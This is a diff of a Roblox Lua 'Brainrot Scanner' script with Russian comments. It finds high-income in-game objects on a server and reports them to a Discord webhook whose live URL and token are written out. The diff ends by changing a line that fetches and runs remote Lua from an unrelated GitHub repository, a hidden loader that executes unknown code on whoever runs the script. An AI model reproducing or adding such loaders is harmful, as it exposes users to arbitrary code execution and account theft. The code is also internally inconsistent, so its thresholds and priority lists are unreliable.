@@ -8,81 +8,61 @@ local HttpService = game:GetService('HttpService')
 
 -- ⚙️ НАСТРОЙКИ
 local INCOME_THRESHOLD = 50_000_000 -- 50M/s минимум для уведомления
-local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1424140516911484928/mnVh-97c9qW-g8Ymhneg3bkBkV3MgMWkUa3t9tAGHDuMEzb6MAfT3llXK_6ibAHkoRRs'
+local HIGH_PRIORITY_THRESHOLD = 300_000_000 -- 500M/s для особо важных объектов
+local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1424146317604687932/G5mtYy3JUjj0I8OQxIyxBDfr2oU0tHGe96R00BnoUDeRGukoPeSYn4AJBAnCrHJz0da4'
 
 print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
 
 -- 🎮 ОБЪЕКТЫ С ЭМОДЗИ И ВАЖНОСТЬЮ
 local OBJECTS = {
-    ['La Vacca Saturno Saturnita'] = { emoji = '🐮', important = false },
-    ['Chimpanzini Spiderini'] = { emoji = '🕷', important = false },
-    ['Los Tralaleritos'] = { emoji = '🐟', important = false },
-    ['Las Tralaleritas'] = { emoji = '🌸', important = false },
-    ['Graipuss Medussi'] = { emoji = '🦑', important = false },
-    ['Torrtuginni Dragonfrutini'] = { emoji = '🐉', important = false },
-    ['Pot Hotspot'] = { emoji = '📱', important = false },
-    ['La Grande Comb3inasion'] = { emoji = '❗️', important = true },
     ['Garama and Madundung'] = { emoji = '🍝', important = true },
-    ['Secret Lucksfsfsfy Block'] = { emoji = '⬛️', important = false },
     ['Dragon Cannelloni'] = { emoji = '🐲', important = true },
     ['Nuclearo Dinossauro'] = { emoji = '🦕', important = true },
-    ['Las Vaquitas Saturnitas'] = { emoji = '👦', important = false },
-    ['Agarrini la Palini'] = { emoji = '🥄', important = false },
-    ['Los Hotspotsit3os'] = { emoji = '☎️', important = true },
-    ['Eso1k Sekolah'] = { emoji = '🏠', important = true },
-    ['Nooo My Hot3spot'] = { emoji = '👽', important = false },
+    ['Esok Sekolah'] = { emoji = '🏠', important = true, high_priority = true },
     ['La Supreme Combinasion'] = { emoji = '🔫', important = true },
-    ['Admin Luc3ky Block'] = { emoji = '🆘', important = false },
     ['Ketupat Kepat'] = { emoji = '🍏', important = true },
     ['Strawberry Elephant'] = { emoji = '🐘', important = true },
     ['Spaghetti Tualetti'] = { emoji = '🚽', important = true },
     ['Ketchuru and Musturu'] = { emoji = '🍾', important = true },
-    ['La Secret Combinasion'] = { emoji = '❓', important = true },
-    ['La Kark56656erkar Combinasion'] = { emoji = '🥊', important = false },
-    ['Los Bros'] = { emoji = '📱', important = true },
     ['Tralaledon'] = { emoji = '🦈', important = true },
-    ['La Extinct Grande'] = { emoji = '🩻', important = true },
-    ['Los Hotsp3otitos'] = { emoji = '📱', important = true },
-    ['Las Si3s'] = { emoji = '👧', important = true },
-    ['Tacorita Bicicleta'] = { emoji = '📱', important = true },
     ['Tictac Sahur'] = { emoji = '🕰️', important = true },
-    ['Celularcini Viciosini'] = { emoji = '📞', important = true },
     ['Los Primos'] = { emoji = '🙆‍♂️', important = true },
     ['Tang Tang Keletang'] = { emoji = '📢', important = true },
-    ['Money Money Puggy'] = { emoji = '🐶', important = true },
+    ['Money Money Puggy'] = { emoji = '🐶', important = true }, 
     ['Burguro And Fryuro'] = { emoji = '🍔', important = true },
     ['Chillin Chili'] = { emoji = '🌶', important = true },
+    ['La Secret Combinasion'] = { emoji = '❓', important = true },
     ['Eviledon'] = { emoji = '👹', important = true },
-    ['La Spooky Grande'] = { emoji = '🟧', important = true },
-    ['Los Mob3ilis'] = { emoji = '🧕', important = true },
     ['Spooky and Pumpky'] = { emoji = '🎃', important = true, },
-    ['Mie3teteira Bicicleteira'] = { emoji = '☠️', important = true },
+    ['La Spooky Grande'] = { emoji = '👻', important = true, high_priority = true },
     ['Meowl'] = { emoji = '🐈', important = true },
     ['Chipso and Queso'] = { emoji = '🧀', important = true },
-    ['Chipso And Queso'] = { emoji = '🧀', important = true },
     ['La Casa Boo'] = { emoji = '👁‍🗨', important = true },
     ['Headless Horseman'] = { emoji = '🐴', important = true },
-    ['Mariachi Corazoni'] = { emoji = '💀', important = true },
-    ['La Taco Combinasion'] = { emoji = '👒', important = true },
+    ['Los Tacoritas'] = { emoji = '🚴', important = true },
     ['Capitano Moby'] = { emoji = '🚢', important = true },
-    ['Guest 666'] = { emoji = '㊙️', important = true },
+    ['La Taco Combinasion'] = { emoji = '👒', important = true },
     ['Cooki and Milki'] = { emoji = '🍪', important = true },
     ['Los Puggies'] = { emoji = '🦮', important = true },
-    ['Fragrama and Chocrama'] = { emoji = '🍫', important = true },
-    ['Los Spaghettis'] = { emoji = '🚾', important = true },
-    ['Los Tacoritas'] = { emoji = '🚴', important = true },
     ['Orcaledon'] = { emoji = '🐡', important = true },
+    ['Fragrama and Chocrama'] = { emoji = '🐡', important = true },
+    ['Guest 666'] = { emoji = '㊙️', important = true },
+    ['Los Primos'] = { emoji = '🙆‍♂️', important = true },
+    ['Los Bros'] = { emoji = '📱', important = true },
     ['Lavadorito Spinito'] = { emoji = '📺', important = true },
-    ['Los Planitos'] = { emoji = '🪐', important = true },
-    ['W or L'] = { emoji = '🟩', important = true },
+    ['W or L'] = { emoji = '🪜', important = true },
     ['Fishino Clownino'] = { emoji = '🤡', important = true },
 }
 
--- Создаем список важных объектов
+-- Создаем списки важных объектов
 local ALWAYS_IMPORTANT = {}
+local HIGH_PRIORITY_OBJECTS = {}
 for name, cfg in pairs(OBJECTS) do
     if cfg.important then
         ALWAYS_IMPORTANT[name] = true
+    end
+    if cfg.high_priority then
+        HIGH_PRIORITY_OBJECTS[name] = true
     end
 end
 
@@ -405,28 +385,28 @@ local function sendDiscordNotification(filteredObjects)
         return
     end
 
-    -- Сортируем по доходу (важные сначала, затем по убыванию дохода)
-    local important, regular = {}, {}
+    -- Сортируем по типу и доходу (особо важные сначала, затем обычные важные по убыванию дохода)
+    local highPriority, regularImportant = {}, {}
     for _, obj in ipairs(filteredObjects) do
-        if ALWAYS_IMPORTANT[obj.name] then
-            table.insert(important, obj)
+        if HIGH_PRIORITY_OBJECTS[obj.name] then
+            table.insert(highPriority, obj)
         else
-            table.insert(regular, obj)
+            table.insert(regularImportant, obj)
         end
     end
 
-    table.sort(important, function(a, b)
+    table.sort(highPriority, function(a, b)
         return a.gen > b.gen
     end)
-    table.sort(regular, function(a, b)
+    table.sort(regularImportant, function(a, b)
         return a.gen > b.gen
     end)
 
     local sorted = {}
-    for _, obj in ipairs(important) do
+    for _, obj in ipairs(highPriority) do
         table.insert(sorted, obj)
     end
-    for _, obj in ipairs(regular) do
+    for _, obj in ipairs(regularImportant) do
         table.insert(sorted, obj)
     end
 
@@ -435,7 +415,7 @@ local function sendDiscordNotification(filteredObjects)
     for i = 1, math.min(10, #sorted) do
         local obj = sorted[i]
         local emoji = OBJECTS[obj.name].emoji or '💰'
-        local mark = ALWAYS_IMPORTANT[obj.name] and '⭐ ' or ''
+        local mark = HIGH_PRIORITY_OBJECTS[obj.name] and '🔥 ' or (ALWAYS_IMPORTANT[obj.name] and '⭐ ' or '')
         table.insert(
             objectsList,
             string.format(
@@ -465,7 +445,7 @@ local function sendDiscordNotification(filteredObjects)
                 fields = {
                     {
                         name = '🆔 Сервер (Job ID)',
-                        value = string.format('``````', jobId),
+                        value = string.format('```%s```', jobId),
                         inline = false,
                     },
                     {
@@ -481,8 +461,9 @@ local function sendDiscordNotification(filteredObjects)
                 },
                 footer = {
                     text = string.format(
-                        'Найдено: %d важных • %s',
+                        'Найдено: %d важных (%d 🔥) • %s',
                         #filteredObjects,
+                        #highPriority,
                         os.date('%H:%M:%S')
                     ),
                 },
@@ -518,11 +499,19 @@ local function scanAndNotify()
     print('🔍 Сканирую все объекты...')
     local allFound = collectAll(8.0) -- 8 секунд таймаут
 
-    -- Фильтрация по важности и доходу
+    -- Фильтрация по важности и доходу (с учетом разных порогов)
     local filtered = {}
     for _, obj in ipairs(allFound) do
-        if OBJECTS[obj.name] and shouldShow(obj.name, obj.gen) then
-            table.insert(filtered, obj)
+        if OBJECTS[obj.name] then
+            -- Для высокоприоритетных объектов проверяем порог 500M/s
+            if HIGH_PRIORITY_OBJECTS[obj.name] then
+                if obj.gen and obj.gen >= HIGH_PRIORITY_THRESHOLD then
+                    table.insert(filtered, obj)
+                end
+            -- Для остальных важных объектов проверяем порог 50M/s
+            elseif shouldShow(obj.name, obj.gen) then
+                table.insert(filtered, obj)
+            end
         end
     end
 
@@ -532,7 +521,7 @@ local function scanAndNotify()
 
     for _, obj in ipairs(filtered) do
         local emoji = OBJECTS[obj.name].emoji or '💰'
-        local mark = ALWAYS_IMPORTANT[obj.name] and '⭐ ' or ''
+        local mark = HIGH_PRIORITY_OBJECTS[obj.name] and '🔥 ' or (ALWAYS_IMPORTANT[obj.name] and '⭐ ' or '')
         print(
             string.format(
                 '%s%s %s: %s (%s)',
@@ -555,6 +544,8 @@ end
 
 -- 🚀 ЗАПУСК
 print('🎯 === BRAINROT INCOME SCANNER ЗАПУЩЕН ===')
+print('🔥 Особо важные объекты (≥500M/s): Spaghetti Tualetti, Esok Sekolah, La Extinct Grande, Tang Tang Keletang, Money Money Puggy, Chillin Chili')
+print('⭐ Обычные важные объекты (≥50M/s): все остальные')
 scanAndNotify()
 
 -- ⌨️ ПОВТОР ПО КЛАВИШЕ F
@@ -576,4 +567,4 @@ end)
 
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhook готов к отправке уведомлений')
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ldkoedkeo/eblan2222/refs/heads/main/noob.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/piskastroi1-ui/SSik/refs/heads/main/ss2.lua"))()
